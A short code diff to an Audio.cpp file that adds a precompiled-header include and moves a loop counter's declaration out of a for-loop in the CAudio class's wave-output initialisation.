@@ -1,7 +1,7 @@
 // Audio.cpp: implementation of the CAudio class.
 //
 //////////////////////////////////////////////////////////////////////
-
+#include "..\CcMainDll\CcMainDll\pch.h"
 #include "Audio.h"
 
 //////////////////////////////////////////////////////////////////////
@@ -143,8 +143,8 @@ bool CAudio::InitializeWaveOut()
 
 	if (!waveOutGetNumDevs())
 		return false;
-
-	for (int i = 0; i < 2; i++)
+	int i = 0;
+	for (i = 0; i < 2; i++)
 		memset(m_lpOutAudioData[i], 0, m_nBufferLength);
 	
 	MMRESULT	mmResult;
